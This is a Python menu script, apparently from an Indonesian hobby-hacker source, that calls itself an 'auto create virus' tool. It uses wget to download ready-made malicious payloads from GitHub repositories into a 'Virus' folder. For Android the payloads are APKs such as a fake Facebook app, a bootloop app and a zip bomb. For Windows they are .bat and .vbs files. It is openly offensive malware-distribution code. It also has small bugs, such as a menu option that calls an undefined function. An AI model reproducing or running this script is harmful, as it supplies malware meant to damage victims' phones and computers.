#!/usr/bin/python
#coding=utf-8

# Visit My Blog : www.nagato-official23.my.id
# Facebook : Mochammad Taufiq Hidayat

import os,sys,time,wget

try:
	os.mkdir('Virus')
except OSError:
	pass

def main():
	logo = ("""\x1b[00m[ \x1b[92mAUTO CREATE VIRUS \x1b[00m]\n""")
	print(logo)
	print('[1] Create Virus For Android')
	print('[2] Create Virus For Windows')
	h1 = input('choose:')
	if h1 =='1':
		android()
	elif h1 =='2':
		windows()
	elif h1 =='3':
		virtex()
	else:
		print('wrong input!!')
		time.sleep(3)
		main()

def android():
	os.system('clear')
	logo = ("""\x1b[00m[ \x1b[91mCREATE VIRUS ANDROID\x1b[00m ]\n""")
	print(logo)
	print('1. Pulsa Gratis APK')
	print('2. Fake Facebook APK')
	print('3. Unlimited Telpon APK')
	print('4. BootLoop APK')
	print('5. BapakKau APK')
	h2 = input('pilih bos:')
	if h2=='1':
		print('sedang Mendownload....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/TobzCyberTeam/Virus/blob/master/ApkPulsaGratis.apk')
		time.sleep(2)
		print('File Save To ~> \x1b[92m/Virus/ApkPulsaGratis.apk\x1b[00m')
		h3 = input('ketik Y untuk membuat virus lagi, Ketik N untuk keluar dari program')
		if h3 =='Y' or h3=='y':
			time.sleep(1)
			main()
		elif h3 =='N' or h3=='n':
			time.sleep(1)
			print('exit')
			os.sys.exit(0)
		else:
			print('wrong input!')
			os.sys.exit(0)

	elif h2=='2':
		print('sedang Mendownload....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/Gameye98/V1RU5/raw/master/fbcr.apk')
		time.sleep(2)
		print('File Save To ~> \x1b[92m/Virus/fbcr.apk/x1b[00m')
		h4 = input('ketik Y untuk membuat virus lagi, Ketik N untuk keluar dari program')
		if h4 =='Y' or h4=='y':
			time.sleep(1)
			main()
		elif h4=='N' or h4=='n':
			time.sleep(1)
			print('exit')
			os.sys.exit(0)
		else:
			print('wrong input!')
			os.sys.exit(0)

	elif h2=='3':
		print('sedang Mendownload....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/Gameye98/V1RU5/raw/master/42.zip')
		time.sleep(2)
		print('File Save To ~> \x1b[92m/Virus/42.zip\x1b[00m')
		h5 = input('ketik Y untuk membuat virus lagi, Ketik N untuk keluar dari program')
		if h5=='Y' or h5=='y':
			time.sleep(1)
			main()
		elif h5=='N' or h5=='n':
			time.sleep(1)
			os.sys.exit(0)
		else:
			print('wrong input!')
			time.sleep(1)
			os.sys.exit(0)

	elif h2=='4':
		print('sedang Mendownload....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/Gameye98/V1RU5/raw/master/elite.apk')
		time.sleep(2)
		print('File Save To ~> \x1b[92m/Virus/elite.apk\x1b[00m')
		h6 = input ('ketik Y untuk membuat virus lagi, Ketik N untuk keluar dari program')
		if h6=='Y' or h6=='y':
			time.sleep(1)
			main()
		elif h6=='N' or h6=='n':
			time.sleep(1)
			print('exit')
			os.sys.exit(0)
		else:
			print('wrong input!')
			time.sleep(1)
			os.sys.exit(0)

	elif h2=='5':
		print('sedang Mendownload....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/Gameye98/V1RU5/raw/master/Malum.apk')
		time.sleep(2)
		print('File Save To ~> \x1b[92m/Virus/Malum.apk\x1b[00m')
		h7 = input ('ketik Y untuk membuat virus lagi, Ketik N untuk keluar dari program')
		if h7=='Y' or h7=='y':
			time.sleep(1)
			main()
		elif h7=='N' or h7=='n':
			time.sleep(1)
			print('exit')
			os.sys.exit(0)
		else:
			print('wrong input!')
			time.sleep(1)
			os.sys.exit(0)

def windows ():
	os.system('clear')
	logo = ("""[\x1b[00m \x1b[93mCREATE VIRUS WINDOWS \x1b[00m]""")
	print(logo)
	print('1. 404.bat')
	print('2. CMD.bat')
	print('3. regeater.bat')
	print('4. alay.vbs')
	print('5. kuis.bat')
	w1 = input('choose:')
	if w1=='1':
		print('sedang Mendownload....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/Gameye98/V1RU5/raw/master/404.bat')
		time.sleep(2)
		print('Save File To ~> \x1b[93m/Virus/404.bat\x1b[00m')
		w2 = input('ketik Y untuk membuat virus lagi Ketik N untuk keluar dari program')
		if w2=='Y' or w2=='y':
			time.sleep(1)
			main()
		elif w2=='N' or w2=='n':
			time.sleep(1)
			print('exit')
			os.sys.exit(0)
		else:
			print('wrong input!')
			os.sys.exit(0)
	elif w1=='2':
		print('sedang Mendownload....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/Gameye98/V1RU5/raw/master/cmd.bat')
		time.sleep(2)
		print('Save File To ~> \x1b[93m/Virus/CMD.bat\x1b[00m')
		w3 = input ('ketik Y untuk membuat virus lagi Ketik N untuk keluar dari program')
		if w3=='Y' or w3=='y':
			time.sleep(1)
			main()
		elif w3=='N' or w3=='n':
			time.sleep(1)
			print('exit')
			os.sys.exit(0)
		else:
			print('wrong input!')
			os.sys.exit(0)
	elif w1=='3':
		print('sedang Mendownload....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/Gameye98/V1RU5/raw/master/regeater.bat')
		time.sleep(2)
		print('Save File To ~> \x1b[93m/Virus/regeater.bat\x1b[00m')
		w4 = input ('ketik Y untuk membuat virus lagi Ketik N untuk keluar dari program')
		if w4=='Y' or w4=='y':
			time.sleep(1)
			main()
		elif w4=='N' or w4=='n':
			time.sleep(1)
			print('exit')
			os.sys.exit(0)
		else:
			print('wrong input!')
			os.sys.exit(0)
	elif w1=='4':
		print('sedang Mendownload....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/Gameye98/V1RU5/raw/master/alay.vbs')
		time.sleep(2)
		print('Save File To ~> \x1b[93m/Virus/alay.vbs\x1b[00m')
		w5 = input ('ketik Y untuk membuat virus lagi Ketik N untuk keluar dari program')
		if w5=='Y' or w5=='y':
			time.sleep(1)
			main()
		elif w5=='N' or w5=='n':
			time.sleep(1)
			print('exit')
			os.sys.exit(0)
		else:
			print('wrong input!')
			os.sys.exit(0)
	elif w1=='5':
		print('sedang Mendownload.....')
		time.sleep(4)
		os.system('cd Virus;wget https://github.com/Gameye98/V1RU5/raw/master/kuis.bat')
		time.sleep(2)
		print('Save File To ~> \x1b[93m/Virus/kuis.bat\x1b[00m')
		w6 = input('ketik Y untuk membuat virus lagi Ketik N untuk keluar dari program')
		if w6=='Y' or w6=='y':
			time.sleep(1)
			main()
		elif w6=='N' or w6=='n':
			time.sleep(1)
			print('exit')
			os.sys.exit(0)
		else:
			print('wrong input!')
			os.sys.exit(0)
			
if __name__=='__main__':
	os.system('pkg install wget')
	os.system('xdg-open https://www.nagato-official23.my.id')
	os.system('clear')
	main()